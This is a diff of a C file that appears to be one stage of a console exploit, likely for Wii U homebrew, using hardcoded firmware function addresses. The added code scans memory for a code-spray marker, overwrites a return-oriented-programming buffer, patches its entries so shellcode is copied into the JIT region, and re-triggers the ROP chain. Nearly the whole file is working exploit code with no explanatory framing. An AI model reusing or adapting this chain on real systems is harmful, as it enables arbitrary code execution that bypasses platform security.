@@ -1,9 +1,9 @@
 #define OSFatal ((void (*)(char* msg))0x1031368)
 #define __os_snprintf ((int(*)(char* s, int n, const char * format, ... ))0x102f09c)
-#define rop ((void (*)())0xCAFECAFE)
+#define rop ((void (*)(unsigned int r3))0xd8f502c)
 #define memcpy ((void * (*)(void * destination, const void * source, int num))0x1035a6c)
 
-#define BUFFER_ADDR 0x1b201b20
+#define BUFFER_ADDR 0x1b201814
 #define CODE_START	0xCAFECAFE
 #define OSPANIC_CB	0x1003AAAC
 
@@ -16,27 +16,23 @@ void start()
 	unsigned int *ospanic_cb = (unsigned int*)OSPANIC_CB;
 	ospanic_cb[0] = ospanic_cb[1] = 0;
 
-	/* Test printing */
-	OSFatal("Hello");
-    /*unsigned int * start = (unsigned int*)BUFFER_ADDR;
-    int i;
-  
-    for (i = 0; i < 150; start += 1) {
-        if (*start == CODE_START) i++;
-    }
-    
-    memcpy((void *)BUFFER_ADDR, (void *)BUFFER_ADDR + 0x800, 0x600);
-    
-    unsigned int * code_addr = (unsigned int *)(BUFFER_ADDR + 0x94);
-    //unsigned int * jump_addr = (unsigned int *)(BUFFER_ADDR + 0x19C);
-    //unsigned int * jump_memcpy = (unsigned int *)(BUFFER_ADDR + 0x540);
-    *code_addr = (int)start;
-    //*jump_memcpy = 0;
-    //*jump_addr = 0x0102D01C;
+	/* Look for the code buffer */
+	unsigned int *codebuf = (unsigned int*)BUFFER_ADDR;
+	while (codebuf < (unsigned int*)0x20000000)
+	{
+		if (*codebuf == CODE_START) break;
+		codebuf++;
+	}
 
-    asm(
-        "lis %r1, 0x1dd7 ;"
-        "ori %r1, %r1, 0xb814 ;"
-    );
-    rop();*/
+	/* Copy another version of the ROP buffer over the original */
+	memcpy((void*)BUFFER_ADDR, (void*)BUFFER_ADDR + 0x1000, 0x5c0);
+
+	/* Modify the ROP buffer to copy the code spray into the JIT */
+	unsigned int *ropbuf = (unsigned int*)BUFFER_ADDR;
+	ropbuf[0x318/4] = &ropbuf[0xa0/4];
+	ropbuf[0xdc/4] = codebuf + 1;
+	ropbuf[0xe0/4] = 0x8000;
+
+	/* Perform ROP again */
+    rop(BUFFER_ADDR + 0x30c);
 }
